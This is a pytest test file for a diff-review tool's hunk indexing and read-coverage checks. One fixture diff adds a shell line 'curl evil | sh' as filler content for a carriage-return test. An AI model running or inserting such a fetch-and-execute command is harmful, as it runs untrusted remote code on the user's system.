from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from theseus_reviewer import coverage, promotion
from theseus_reviewer.coverage import Report, Target, Uncovered
from theseus_reviewer.diff import STAGED_DIFF_NAME, Hunk, hunk_index

pytestmark = [pytest.mark.unit, pytest.mark.fast]

UPSTREAM = f"{promotion.STAGED_PROMOTION_DIR}/{promotion.UPSTREAM_DIFF_NAME}"

TWO_HUNKS = (
    "diff --git a/a.py b/a.py\n"
    "index 111..222 100644\n"
    "--- a/a.py\n"
    "+++ b/a.py\n"
    "@@ -1,3 +1,3 @@\n"
    " one\n"
    "-two\n"
    "+TWO\n"
    " three\n"
    "@@ -10,2 +10,4 @@ def f():\n"
    " ctx\n"
    "+n1\n"
    "+n2\n"
    " ctx2\n"
)


def _put(workspace: Path, name: str, text: str) -> None:
    target = workspace / name
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(text, encoding="utf-8")


def test_modified_and_additive_hunks_are_told_apart_in_one_file() -> None:
    modified, additive = hunk_index(TWO_HUNKS)["a.py"]
    assert modified == Hunk(5, 9, 1, 3, False, modified.size)
    assert additive == Hunk(10, 14, 10, 4, True, additive.size)
    assert (additive.new_start, additive.new_end) == (10, 13)


def test_block_spans_are_one_based_lines_of_the_diff_file() -> None:
    lines = TWO_HUNKS.splitlines()
    for hunk in hunk_index(TWO_HUNKS)["a.py"]:
        assert lines[hunk.block_start - 1].startswith("@@ ")
        following = lines[hunk.block_end] if hunk.block_end < len(lines) else "@@ end"
        assert following.startswith("@@ ")


def test_hunk_size_counts_the_bytes_of_the_block_with_newlines() -> None:
    diff = "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1 @@\n-é\n+x\n"
    (hunk,) = hunk_index(diff)["a.py"]
    block = "".join(diff.splitlines(keepends=True)[hunk.block_start - 1 : hunk.block_end])
    assert hunk.size == len(block.encode("utf-8")) == 19
    first, second = hunk_index(TWO_HUNKS)["a.py"]
    lines = TWO_HUNKS.splitlines(keepends=True)
    assert first.size == len("".join(lines[4:9]).encode("utf-8"))
    assert second.size == len("".join(lines[9:14]).encode("utf-8"))


def test_the_no_newline_marker_belongs_to_the_block_and_is_not_a_line() -> None:
    diff = (
        "diff --git a/a.py b/a.py\n"
        "--- a/a.py\n"
        "+++ b/a.py\n"
        "@@ -1 +1 @@\n"
        "-old\n"
        "\\ No newline at end of file\n"
        "+new\n"
        "\\ No newline at end of file\n"
        "diff --git a/b.py b/b.py\n"
        "--- a/b.py\n"
        "+++ b/b.py\n"
        "@@ -1 +1,2 @@\n"
        " x\n"
        "+y\n"
    )
    index = hunk_index(diff)
    assert [(h.block_start, h.block_end, h.new_count, h.additive) for h in index["a.py"]] == [(4, 8, 1, False)]
    assert [(h.block_start, h.block_end, h.new_count, h.additive) for h in index["b.py"]] == [(12, 14, 2, True)]


def test_a_hunk_header_without_counts_means_one_line() -> None:
    diff = "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -3 +3 @@\n-a\n+b\n"
    (hunk,) = hunk_index(diff)["a.py"]
    assert (hunk.new_start, hunk.new_count, hunk.new_end, hunk.additive) == (3, 1, 3, False)


def test_a_block_ends_at_the_last_line_of_a_diff_without_a_trailing_newline() -> None:
    diff = "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1 @@\n-a\n+b"
    (hunk,) = hunk_index(diff)["a.py"]
    assert (hunk.block_start, hunk.block_end) == (4, 6)


def test_a_pure_insertion_between_lines_is_additive_with_its_new_span() -> None:
    diff = "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -5,0 +6,2 @@\n+a\n+b\n"
    (hunk,) = hunk_index(diff)["a.py"]
    assert (hunk.additive, hunk.new_start, hunk.new_end) == (True, 6, 7)


def test_an_added_file_is_one_additive_hunk() -> None:
    diff = "diff --git a/n.py b/n.py\nnew file mode 100644\n--- /dev/null\n+++ b/n.py\n@@ -0,0 +1,2 @@\n+a\n+b\n"
    assert hunk_index(diff) == {"n.py": [Hunk(5, 7, 1, 2, True, 22)]}


def test_a_deleted_file_is_keyed_by_its_path_and_is_not_additive() -> None:
    diff = "diff --git a/g.py b/g.py\ndeleted file mode 100644\n--- a/g.py\n+++ /dev/null\n@@ -1,2 +0,0 @@\n-a\n-b\n"
    (hunk,) = hunk_index(diff)["g.py"]
    assert (hunk.additive, hunk.new_start, hunk.new_count, hunk.new_end) == (False, 0, 0, 0)
    assert (hunk.block_start, hunk.block_end) == (5, 7)


def test_files_without_text_hunks_map_to_an_empty_list() -> None:
    diff = (
        "diff --git a/o.py b/n.py\n"
        "similarity index 100%\n"
        "rename from o.py\n"
        "rename to n.py\n"
        "diff --git a/b.bin b/b.bin\n"
        "Binary files a/b.bin and b/b.bin differ\n"
        "diff --git a/m.sh b/m.sh\n"
        "old mode 100644\n"
        "new mode 100755\n"
    )
    assert hunk_index(diff) == {"n.py": [], "b.bin": [], "m.sh": []}


def test_a_similarity_rename_with_hunks_is_keyed_by_the_new_path() -> None:
    diff = (
        "diff --git a/o2.py b/n2.py\n"
        "similarity index 90%\n"
        "rename from o2.py\n"
        "rename to n2.py\n"
        "--- a/o2.py\n"
        "+++ b/n2.py\n"
        "@@ -1,2 +1,2 @@\n"
        " a\n"
        "-b\n"
        "+c\n"
    )
    index = hunk_index(diff)
    assert list(index) == ["n2.py"]
    assert [(h.block_start, h.block_end, h.additive) for h in index["n2.py"]] == [(7, 10, False)]


def test_quoted_utf8_and_spaced_paths_are_decoded() -> None:
    diff = (
        'diff --git "a/sp\\303\\251.py" "b/sp\\303\\251.py"\n'
        '--- "a/sp\\303\\251.py"\n'
        '+++ "b/sp\\303\\251.py"\n'
        "@@ -1 +1 @@\n"
        "-a\n"
        "+b\n"
        "diff --git a/with space.py b/with space.py\n"
        "--- a/with space.py\n"
        "+++ b/with space.py\n"
        "@@ -1 +1 @@\n"
        "-a\n"
        "+b\n"
    )
    index = hunk_index(diff)
    assert list(index) == ["spé.py", "with space.py"]
    assert [h.block_start for h in index["spé.py"]] == [4]
    assert [h.block_start for h in index["with space.py"]] == [10]


def test_a_binary_file_with_a_quoted_name_is_listed_without_hunks() -> None:
    diff = 'diff --git "a/b\\303\\251.bin" "b/b\\303\\251.bin"\nBinary files "a/b\\303\\251.bin" and "b/b\\303\\251.bin" differ\n'
    assert hunk_index(diff) == {"bé.bin": []}


@pytest.mark.parametrize("text", ["", "\n", "not a diff\n+added\n-removed\n"])
def test_text_without_a_diff_has_no_files(text: str) -> None:
    assert hunk_index(text) == {}


def test_a_line_that_looks_like_a_header_inside_a_hunk_is_body() -> None:
    diff = "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1,2 +1,2 @@\n--- a/b.py\n+++ b/b.py\n keep\n"
    index = hunk_index(diff)
    assert list(index) == ["a.py"]
    assert [(h.block_start, h.block_end) for h in index["a.py"]] == [(4, 7)]


@pytest.mark.parametrize(
    ("numbers", "expected"),
    [
        ([], ()),
        ([3], ((3, 3),)),
        ([5, 1, 2, 3, 9, 9, 10], ((1, 3), (5, 5), (9, 10))),
        (iter([4, 3, 2, 8]), ((2, 4), (8, 8))),
    ],
)
def test_merge_collapses_numbers_into_sorted_ranges(numbers: Any, expected: coverage.Ranges) -> None:
    assert coverage.merge(numbers) == expected


@pytest.mark.parametrize(
    ("groups", "expected"),
    [
        ((), ()),
        (((),), ()),
        ((((1, 3),), ((4, 6),)), ((1, 6),)),
        ((((1, 3),), ((5, 6),)), ((1, 3), (5, 6))),
        ((((5, 9),), ((1, 3), (7, 12))), ((1, 3), (5, 12))),
        ((((1, 20),), ((3, 4), (8, 9))), ((1, 20),)),
        ((((8, 9), (1, 2)), ((2, 3),)), ((1, 3), (8, 9))),
    ],
)
def test_join_merges_overlapping_and_adjacent_ranges_from_many_groups(
    groups: tuple[coverage.Ranges, ...], expected: coverage.Ranges
) -> None:
    assert coverage.join(*groups) == expected


@pytest.mark.parametrize(
    ("ranges", "start", "end", "expected"),
    [
        (((1, 10),), 1, 10, True),
        (((1, 10),), 5, 5, True),
        (((1, 10),), 0, 3, False),
        (((1, 10),), 8, 11, False),
        (((1, 5), (7, 10)), 4, 8, False),
        (((1, 5), (7, 10)), 7, 10, True),
        ((), 1, 1, False),
    ],
)
def test_contains_needs_one_range_to_hold_the_whole_span(
    ranges: coverage.Ranges, start: int, end: int, expected: bool
) -> None:
    assert coverage.contains(ranges, start, end) is expected


def test_the_unmerged_adjacent_ranges_of_two_reads_must_be_joined_to_hold_a_span() -> None:
    reads = ((1, 5), (6, 10))
    assert not coverage.contains(reads, 4, 7)
    assert coverage.contains(coverage.join(reads), 4, 7)


def test_holds_line_accepts_everything_without_a_returned_mapping() -> None:
    assert coverage.holds_line(None, "a.py", 99)
    assert coverage.holds_line({"a.py": ((1, 5),)}, "a.py", 5)
    assert not coverage.holds_line({"a.py": ((1, 5),)}, "a.py", 6)
    assert not coverage.holds_line({"a.py": ((1, 5),)}, "b.py", 1)


def test_canonical_resolves_links_inside_the_workspace_and_leaves_outside_paths(tmp_path: Path) -> None:
    workspace = tmp_path / "ws"
    (workspace / "pkg").mkdir(parents=True)
    (workspace / "pkg" / "real.py").write_text("x\n", encoding="utf-8")
    (workspace / "pkg" / "link.py").symlink_to("real.py")
    outside = tmp_path / "out.py"
    outside.write_text("x\n", encoding="utf-8")
    (workspace / "escape.py").symlink_to(outside)
    assert coverage.canonical("pkg/link.py", workspace) == "pkg/real.py"
    assert coverage.canonical("./pkg/real.py", workspace) == "pkg/real.py"
    assert coverage.canonical("pkg/../pkg/real.py", workspace) == "pkg/real.py"
    assert coverage.canonical("pkg/missing.py", workspace) == "pkg/missing.py"
    assert coverage.canonical("escape.py", workspace) == "escape.py"


def _target(path: str, hunks: tuple[Hunk, ...], *, diff: str | None = STAGED_DIFF_NAME, **kwargs: Any) -> Target:
    return Target(path, diff, hunks, True, **kwargs)


MODIFIED = Hunk(5, 9, 1, 3, False, 40)
ADDITIVE = Hunk(10, 14, 10, 4, True, 46)


def test_evaluate_counts_every_hunk_of_every_needed_file(tmp_path: Path) -> None:
    found = {"a.py": _target("a.py", (MODIFIED, ADDITIVE))}
    report = coverage.evaluate(found, ["a.py"], {STAGED_DIFF_NAME: ((5, 9),)}, tmp_path)
    assert (report.total, report.covered) == (2, 1)
    assert report.uncovered == (Uncovered("a.py", STAGED_DIFF_NAME, 10, 14),)
    assert report.files == ("a.py",)
    assert not report.complete
    whole = coverage.evaluate(found, ["a.py"], {STAGED_DIFF_NAME: ((1, 14),)}, tmp_path)
    assert whole.complete and (whole.total, whole.covered) == (2, 2)


def test_evaluate_ignores_files_that_are_not_needed(tmp_path: Path) -> None:
    found = {"a.py": _target("a.py", (MODIFIED,)), "b.py": _target("b.py", (ADDITIVE,))}
    report = coverage.evaluate(found, ["b.py"], {}, tmp_path)
    assert (report.total, report.covered) == (1, 0)
    assert [item.path for item in report.uncovered] == ["b.py"]


def test_a_listed_file_without_hunks_needs_no_read(tmp_path: Path) -> None:
    report = coverage.evaluate({"n.py": _target("n.py", ())}, ["n.py"], {}, tmp_path)
    assert report.complete and report.total == 0


def test_a_needed_file_outside_the_diff_needs_some_returned_line(tmp_path: Path) -> None:
    missing = coverage.evaluate({}, ["x.py"], {}, tmp_path)
    assert missing.untouched == ("x.py",) and missing.files == ("x.py",) and not missing.complete
    unlisted = {"x.py": Target("x.py", STAGED_DIFF_NAME, (), False)}
    assert coverage.evaluate(unlisted, ["x.py"], {}, tmp_path).untouched == ("x.py",)
    assert coverage.evaluate(unlisted, ["x.py"], {"x.py": ((1, 1),)}, tmp_path).complete


def test_a_target_without_a_diff_file_covers_its_hunks_by_construction(tmp_path: Path) -> None:
    found = {"a.py": _target("a.py", (MODIFIED, ADDITIVE), diff=None)}
    report = coverage.evaluate(found, ["a.py"], {}, tmp_path)
    assert report.complete and (report.total, report.covered) == (2, 2)


def test_an_additive_hunk_is_covered_by_its_file_but_a_modified_one_is_not(tmp_path: Path) -> None:
    found = {"a.py": _target("a.py", (MODIFIED, ADDITIVE))}
    report = coverage.evaluate(found, ["a.py"], {"a.py": ((1, 50),)}, tmp_path)
    assert [(item.start, item.end) for item in report.uncovered] == [(5, 9)]


def test_an_additive_hunk_needs_its_whole_new_span_in_one_joined_range(tmp_path: Path) -> None:
    found = {"a.py": _target("a.py", (ADDITIVE,))}
    assert not coverage.evaluate(found, ["a.py"], {"a.py": ((10, 12),)}, tmp_path).complete
    assert not coverage.evaluate(found, ["a.py"], {"a.py": ((11, 13),)}, tmp_path).complete
    assert coverage.evaluate(found, ["a.py"], {"a.py": ((10, 13),)}, tmp_path).complete


def test_evaluate_matches_reads_by_canonical_path(tmp_path: Path) -> None:
    _put(tmp_path, "pkg/real.py", "x\n")
    (tmp_path / "pkg" / "link.py").symlink_to("real.py")
    _put(tmp_path, STAGED_DIFF_NAME, "diff\n")
    found = {"pkg/link.py": _target("pkg/link.py", (MODIFIED,))}
    returned = {"./.oracle-pull-request.diff": ((5, 9),), "pkg/real.py": ((1, 1),)}
    assert coverage.evaluate(found, ["pkg/link.py"], returned, tmp_path).complete


def test_evaluate_joins_returned_ranges_that_reach_it_under_two_spellings(tmp_path: Path) -> None:
    _put(tmp_path, STAGED_DIFF_NAME, "diff\n")
    found = {"a.py": _target("a.py", (MODIFIED,))}
    returned = {STAGED_DIFF_NAME: ((5, 7),), f"./{STAGED_DIFF_NAME}": ((8, 9),)}
    assert coverage.evaluate(found, ["a.py"], returned, tmp_path).complete


def test_a_removed_promotion_file_is_covered_by_a_whole_old_read(tmp_path: Path) -> None:
    old = f"{promotion.STAGED_PROMOTION_DIR}/old/pkg/gone.py"
    _put(tmp_path, old, "a\nb\nc\n")
    hunk = Hunk(5, 8, 0, 0, False, 30)
    found = {old: _target(old, (hunk,), diff=UPSTREAM, removed=True)}
    assert not coverage.evaluate(found, [old], {}, tmp_path).complete
    assert not coverage.evaluate(found, [old], {old: ((1, 2),)}, tmp_path).complete
    assert coverage.evaluate(found, [old], {old: ((1, 3),)}, tmp_path).complete
    assert coverage.evaluate(found, [old], {UPSTREAM: ((5, 8),)}, tmp_path).complete


def test_an_empty_removed_file_is_not_covered_by_reading_nothing(tmp_path: Path) -> None:
    old = f"{promotion.STAGED_PROMOTION_DIR}/old/empty.py"
    _put(tmp_path, old, "")
    found = {old: _target(old, (Hunk(5, 6, 0, 0, False, 10),), diff=UPSTREAM, removed=True)}
    assert not coverage.evaluate(found, [old], {old: ((1, 1),)}, tmp_path).complete


def test_report_files_lists_each_open_file_once_in_order() -> None:
    report = Report(
        4,
        1,
        (Uncovered("b.py", "d", 1, 2), Uncovered("b.py", "d", 3, 4), Uncovered("a.py", "d", 1, 2)),
        ("c.py", "a.py"),
    )
    assert report.files == ("b.py", "a.py", "c.py")
    assert Report(0, 0).complete


def test_reason_names_spans_and_stays_bounded() -> None:
    single = Report(2, 1, (Uncovered("a.py", STAGED_DIFF_NAME, 7, 7),))
    assert (
        coverage.reason(single)
        == f"1 of 2 changed hunks in 1 required files were not seen: a.py ({STAGED_DIFF_NAME} lines 7)"
    )
    spans = tuple(Uncovered("a.py", "d", index * 10, index * 10 + 3) for index in range(1, 7))
    text = coverage.reason(Report(6, 0, spans))
    assert "d lines 10-13, d lines 20-23, d lines 30-33, d lines 40-43 and 2 more" in text
    many = tuple(Uncovered(f"pkg/f{index}.py", "d", 1, 2) for index in range(9))
    text = coverage.reason(Report(9, 0, many, tuple(f"pkg/u{index}.py" for index in range(6))))
    assert "and 5 more files" in text
    assert "no read of pkg/u0.py, pkg/u1.py, pkg/u2.py, pkg/u3.py and 2 more" in text
    assert "pkg/f4.py" not in text
    huge = tuple(Uncovered("p" * 200 + str(index), "d", 1, 2) for index in range(4))
    assert len(coverage.reason(Report(4, 0, huge))) <= 600


def test_targets_for_a_file_list_review_read_the_staged_diff(tmp_path: Path) -> None:
    _put(tmp_path, STAGED_DIFF_NAME, TWO_HUNKS)
    found = coverage.targets({"evidence_files": ["a.py", "other.py"]}, tmp_path)
    assert found["a.py"].diff == STAGED_DIFF_NAME
    assert found["a.py"].listed and len(found["a.py"].hunks) == 2
    assert not found["other.py"].listed and found["other.py"].hunks == ()
    assert not found["a.py"].removed


def test_targets_without_a_staged_diff_list_nothing(tmp_path: Path) -> None:
    found = coverage.targets({"evidence_files": ["a.py"]}, tmp_path)
    assert found["a.py"] == Target("a.py", STAGED_DIFF_NAME, (), False, False)


def test_targets_ignore_a_staged_diff_that_is_a_symlink(tmp_path: Path) -> None:
    outside = tmp_path / "outside.diff"
    outside.write_text(TWO_HUNKS, encoding="utf-8")
    workspace = tmp_path / "ws"
    workspace.mkdir()
    (workspace / STAGED_DIFF_NAME).symlink_to(outside)
    assert not coverage.targets({"evidence_files": ["a.py"]}, workspace)["a.py"].listed


def test_targets_for_an_inline_review_use_the_brief_and_need_no_diff_file(tmp_path: Path) -> None:
    _put(
        tmp_path,
        STAGED_DIFF_NAME,
        "diff --git a/other.py b/other.py\n--- a/other.py\n+++ b/other.py\n@@ -1 +1 @@\n-a\n+b\n",
    )
    plan = {"evidence_files": ["a.py", "other.py"], "diff_inline": TWO_HUNKS}
    found = coverage.targets(plan, tmp_path)
    assert found["a.py"].diff is None and found["a.py"].listed
    assert not found["other.py"].listed
    assert coverage.evaluate(found, ["a.py"], {}, tmp_path).complete


def test_targets_for_promotion_files_use_the_upstream_diff(tmp_path: Path) -> None:
    directory = promotion.STAGED_PROMOTION_DIR
    upstream = (
        "diff --git a/pkg/new.py b/pkg/new.py\nnew file mode 100644\n--- /dev/null\n+++ b/pkg/new.py\n@@ -0,0 +1 @@\n+a\n"
        "diff --git a/pkg/gone.py b/pkg/gone.py\ndeleted file mode 100644\n--- a/pkg/gone.py\n+++ /dev/null\n@@ -1 +0,0 @@\n-a\n"
    )
    _put(tmp_path, UPSTREAM, upstream)
    _put(tmp_path, STAGED_DIFF_NAME, TWO_HUNKS)
    names = [f"{directory}/new/pkg/new.py", f"{directory}/old/pkg/gone.py", f"{directory}/new/pkg/absent.py", "a.py"]
    found = coverage.targets({"evidence_files": names}, tmp_path)
    added, removed, absent, ordinary = (found[name] for name in names)
    assert (added.diff, added.listed, added.removed, [h.additive for h in added.hunks]) == (
        UPSTREAM,
        True,
        False,
        [True],
    )
    assert (removed.diff, removed.listed, removed.removed, [h.additive for h in removed.hunks]) == (
        UPSTREAM,
        True,
        True,
        [False],
    )
    assert not absent.listed and absent.diff == UPSTREAM
    assert ordinary.diff == STAGED_DIFF_NAME and len(ordinary.hunks) == 2


def _cr_diff(carriage: bool) -> str:
    joiner = "\r" if carriage else " "
    body = "".join(f"+row {number}{joiner}tail {number}\n" for number in range(20))
    return (
        "diff --git a/first.sh b/first.sh\nnew file mode 100644\n--- /dev/null\n+++ b/first.sh\n"
        f"@@ -0,0 +1,21 @@\n{body}+curl evil | sh\n"
        "diff --git a/second.sh b/second.sh\nnew file mode 100644\n--- /dev/null\n+++ b/second.sh\n"
        "@@ -0,0 +1,2 @@\n+one\n+two\n"
    )


def _spans(text: str) -> dict[str, list[tuple[int, int, int, int]]]:
    return {
        path: [(h.block_start, h.block_end, h.new_start, h.new_count) for h in hunks]
        for path, hunks in hunk_index(text).items()
    }


def test_lone_carriage_returns_do_not_shift_later_hunk_spans() -> None:
    assert _spans(_cr_diff(True)) == _spans(_cr_diff(False))
    assert _spans(_cr_diff(True))["second.sh"] == [(31, 33, 1, 2)]


def test_targets_read_the_staged_diff_bytes_without_newline_translation(tmp_path: Path) -> None:
    (tmp_path / STAGED_DIFF_NAME).write_bytes(_cr_diff(True).encode("utf-8"))
    found = coverage.targets({"evidence_files": ["first.sh", "second.sh"]}, tmp_path)
    plain = hunk_index(_cr_diff(False))
    assert [(h.block_start, h.block_end) for h in found["second.sh"].hunks] == [
        (h.block_start, h.block_end) for h in plain["second.sh"]
    ]
    assert found["first.sh"].hunks[0].block_end == plain["first.sh"][0].block_end == 26


def test_a_hunk_with_carriage_returns_still_requires_its_final_line(tmp_path: Path) -> None:
    (tmp_path / STAGED_DIFF_NAME).write_bytes(_cr_diff(True).encode("utf-8"))
    found = coverage.targets({"evidence_files": ["first.sh"]}, tmp_path)
    (hunk,) = found["first.sh"].hunks
    short = {STAGED_DIFF_NAME: ((1, hunk.block_end - 1),)}
    assert not coverage.evaluate(found, ["first.sh"], short, tmp_path).complete
    whole = {STAGED_DIFF_NAME: ((1, hunk.block_end),)}
    assert coverage.evaluate(found, ["first.sh"], whole, tmp_path).complete


def test_hunk_spans_match_the_line_numbers_git_prints(tmp_path: Path) -> None:
    import subprocess

    def git(*args: str) -> str:
        done = subprocess.run(
            ["git", "-C", str(tmp_path), "-c", "user.name=t", "-c", "user.email=t@example.com", *args],
            check=True,
            capture_output=True,
        )
        return done.stdout.decode("utf-8")

    git("init", "-q")
    (tmp_path / "base.txt").write_text("base\n", encoding="utf-8")
    git("add", "-A")
    git("commit", "-qm", "base")
    (tmp_path / "a.sh").write_bytes(b"one\rtwo\rthree\nfour\r\nfive\nsix\rseven\n")
    (tmp_path / "b.sh").write_bytes(b"x\n")
    git("add", "-A")
    diff = git("diff", "--cached", "--no-color", "-M")
    assert "\r" in diff
    lines = diff.split("\n")
    for hunks in hunk_index(diff).values():
        for hunk in hunks:
            assert lines[hunk.block_start - 1].startswith("@@ ")
            assert lines[hunk.block_end] == "" or lines[hunk.block_end].startswith("diff --git")
